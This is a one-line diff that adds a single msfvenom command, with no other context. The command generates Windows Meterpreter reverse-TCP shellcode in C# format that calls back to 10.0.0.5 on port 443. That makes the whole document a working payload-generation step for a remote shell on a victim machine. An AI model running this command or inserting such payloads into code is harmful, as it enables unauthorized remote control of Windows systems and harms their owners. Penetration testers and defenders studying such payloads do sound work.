@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
